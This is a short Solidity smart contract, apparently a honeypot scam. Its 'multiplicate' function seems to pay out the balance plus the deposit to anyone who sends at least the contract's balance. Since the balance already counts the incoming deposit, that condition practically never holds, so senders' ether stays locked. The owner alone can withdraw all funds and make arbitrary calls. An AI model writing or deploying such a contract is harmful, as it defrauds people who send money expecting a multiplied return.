pragma solidity ^0.4.18;

contract QuadrupleCareBoost
{
    address public Owner = msg.sender;

    function() public payable{}

    function dischargeFunds()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes chart)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(chart);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }
}